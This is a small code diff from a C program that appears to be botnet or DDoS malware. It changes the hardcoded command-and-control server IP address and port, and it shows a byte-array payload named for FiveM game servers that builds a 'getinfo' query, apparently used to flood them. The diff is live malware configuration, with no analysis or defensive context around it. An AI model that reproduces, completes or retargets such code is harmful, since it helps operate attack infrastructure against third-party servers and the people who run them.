@@ -12,8 +12,8 @@
 #include <errno.h>
 
 // Configuration
-#define C2_ADDRESS "134.255.216.46"
-#define C2_PORT 600
+#define C2_ADDRESS "185.194.177.247"
+#define C2_PORT 6666
 
 // Payloads
 unsigned char payload_fivem[] = {0xff, 0xff, 0xff, 0xff, 'g', 'e', 't', 'i', 'n', 'f', 'o', ' ', 'x', 'x', 'x', 0x00, 0x00, 0x00};
